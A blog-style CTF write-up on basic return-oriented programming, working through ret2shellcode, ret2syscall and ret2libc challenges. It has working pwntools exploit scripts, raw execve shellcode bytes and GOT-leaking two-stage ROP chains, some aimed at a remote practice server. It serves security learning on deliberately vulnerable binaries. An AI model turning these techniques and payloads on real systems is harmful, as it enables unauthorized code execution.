---
layout: post
title: "Basic ROP Write Up"
---

# 0x00 Abstract

When I learn about [basic rop](https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/basic_rop/) technology, doing some exercises is necessary. The website not only summarizes the pwn experience but also provides corresponding ctf subjects. To perfect, I practice.

<!-- more -->

# 0x01 ret2shellcode

Subject: [sniperoj-pwn100-shellcode-x86-64](https://raw.githubusercontent.com/SniperOJ/CDN/master/pwn/shorter-shellcode-x86-64)

This is a ret2shellcode problem with disabled NX. With F5 button in IDA, it can be noticed that there are only 32 bytes for our shellcode:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 buf; // [rsp+0h] [rbp-10h]
  __int64 v5; // [rsp+8h] [rbp-8h]

  buf = 0LL;
  v5 = 0LL;
  setvbuf(_bss_start, 0LL, 1, 0LL);
  puts("Welcome to Sniperoj!");
  printf("Do your kown what is it : [%p] ?\n", &buf, 0LL, 0LL);
  puts("Now give me your answer : ");
  read(0, &buf, 0x40uLL);
  return 0;
}
```

Because the `shellcraft.sh()` of [pwntools](https://docs.pwntools.com/en/stable/shellcraft/i386.html) is much larger, we can choose the [29 bytes](http://shell-storm.org/shellcode/files/shellcode-905.php) shellcode to use:

```shell
$ python -c "from pwn import *;print len(asm(shellcraft.sh()))"
44
``` 

```python
import re
from pwn import *

p = process("./shellcode-x86-64")
#p = remote("pwn.sniperoj.com", 20005)
buf_address = int(re.search(r"0x.*?\b", p.recvuntil("answer : ")).group(), 16)
shellcode = ""
shellcode += "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf"
shellcode += "\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54"
shellcode += "\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
payload = "A" * (0x10+8) + p64(buf_address+0x20) + shellcode
p.sendline(payload)
p.interactive()
```

# 0x02 ret2syscall

Subject: [ROP](https://bamboofox.cs.nctu.edu.tw/courses/1/challenges/4)

This problem is just like ret2syscall, we should use the little gadgets to construct the syscall rop chain:

1. We should use `xor eax, eax` instruction to initialize eax and other registers.
2. Some tricks is needed to add eax and mov ebx.
3. It's a good idea to keep the balance of the stack at all times.

By the way, we can use the [run_assembly](https://docs.pwntools.com/en/stable/runner.html) function to test shellcode or debug the tmp elf file:

```python
>>> p = run_assembly("push 0x68732f6e; push 0x69622f2f; pop ebx; pop ebp; xor eax,eax; push eax; push eax; push eax; pop edx; pop ecx; pop edx; push 0x68732f6e; push 0x69622f2f; push esp; push ebp; add ecx,eax; pop ebx; add ecx,eax; pop ebx; push 1; push 2; sub ecx,eax; pop ebp; push eax; pop ecx; pop eax; add eax,0x2; add eax,0x2; add eax,0x2; add eax,0x2; add eax,0x2; int 0x80; pop ebp; pop edi; pop esi; pop ebx")
[*] '/tmp/pwn-asm-jb2ROI/step3'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x10000000)
    RWX:      Has RWX segments
[x] Starting local process '/tmp/pwn-asm-jb2ROI/step3'
[+] Starting local process '/tmp/pwn-asm-jb2ROI/step3': pid 15223
>>> p.sendline('echo Hello')
[*] Process '/tmp/pwn-asm-jb2ROI/step3' stopped with exit code -11 (SIGSEGV) (pid 15223)
```

After debugging the system call string problem, the shell is coming:

```shell
======Your code=====
global  _start
section .text
_start:
	push 0x68732f6e
	push 0x69622f2f
	pop ebx
	pop ebp
	xor eax,eax
	push eax
	push eax
	push eax
	pop edx
	pop ecx
	pop edx
	push eax
	push 0x68732f6e
	push 0x69622f2f
	push esp
	push ebp
	add ecx,eax
	pop ebx
	add ecx,eax
	pop ebx
	push 1
	push 2
	sub ecx,eax
	pop ebp
	push eax
	pop ecx
	pop eax
	add eax,0x2
	add eax,0x2
	add eax,0x2
	add eax,0x2
	add eax,0x2
	int 0x80
	pop ebp
	pop edi
	pop esi
	pop ebx
====================
Executing command:" nasm -f elf32 input.s && ./ld -m elf_i386 -o a.bin input.o && ./a.bin "
running ....
ls
bin
boot
dev
etc
…
```

# 0x03 ret2libc

## exercise one

Subject: [ret2libc](https://bamboofox.cs.nctu.edu.tw/courses/1/challenges/7)

This problem just gives us the `puts` address and the string address of `/bin/sh`:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-14h]@1

  puts("Hello!");
  printf("The address of \"/bin/sh\" is %p\n", binsh);
  printf("The address of function \"puts\" is 0x%x\n", &puts);
  fflush(stdout);
  return __isoc99_scanf("%s", &v4);
}
```

Although it is easy to calculate the system function address with the given libc file, we should adjust the length of padding due to the `and     esp, 0FFFFFFF0h` instruction in main function:

```python
import re
from pwn import *

#p = process("ret2libc")
p = remote("bamboofox.cs.nctu.edu.tw", 11002)
libc = ELF("libc.so.6")

#gdb.attach(p)
p.recvline()
str_sh_address = int(re.search(r"0x.*?\b", p.recvline()).group(), 16)
puts_address = int(re.search(r"0x.*?\b", p.recvline()).group(), 16)
libc_base = puts_address - libc.symbols["puts"]
print hex(libc.symbols["puts"])
system_address = libc_base + libc.symbols["system"]
payload = flat(["A"*(0x14+4+8), system_address, 0xdeadbeef, str_sh_address])

p.sendline(payload)
p.interactive()
```

## exercise two

Subject: [DEF CON Qualifier 2015: r0pbaby](https://github.com/ctfs/write-ups-2015/tree/master/defcon-qualifier-ctf-2015/babys-first/r0pbaby)

The function of this binary file is obvious, it provides us the libc base address and any symbol address, so we could use the libc database or other trick(dump the .so file from other pwned server) to get the address of `/bin/sh` in libc.so.

## exercise three

Subject: [2013-PlaidCTF-ropasaurusrex](https://ctftime.org/task/364)

The solution of this problem is similar to the example. With the given libc.so file, `read` function causes stack overflow and superfluous `write` function can be used to leak information of `read@got.plt`. After leaking, we could return to the fragile function again to ret2system:

```python
from pwn import *

p = process("ropasaurusrex")

binsh_offset = 0x15ffcc
read_offset = 0x000dbd20
system_offset = 0x0003fe70
read_got_address = 0x0804961C
write_plt_address = 0x0804830C
pwn_func_address = 0x080483F4
ppp_ret_address = 0x080484b6

stage1 = ""
stage1 += "A" * (0x88+4)
stage1 += p32(write_plt_address)
stage1 += p32(ppp_ret_address)
stage1 += p32(1)
stage1 += p32(read_got_address)
stage1 += p32(4)
stage1 += p32(pwn_func_address)

p.sendline(stage1)
read_address = u32(p.recv())
libc_base = read_address - read_offset
system_address = libc_base + system_offset
binsh_address = libc_base + binsh_offset

stage2 = ""
stage2 += "A" * (0x88+4)
stage2 += p32(system_address)
stage2 += "B" * 4
stage2 += p32(binsh_address)

p.sendline(stage2)
p.interactive()
```

Additionally, using small gadgets to build rop chain for this challenge is worth [learning](http://blog.sosonkin.com/2014/06/rop-rop-rop.html).

# 0x04 Conclusion

I believe that these problems are pretty easy for you, but the `pwnlib.dynelf` and `ret2dl-resolve` technology is needed for me to exercise, the way to leak information in real world may be more universal or complex.
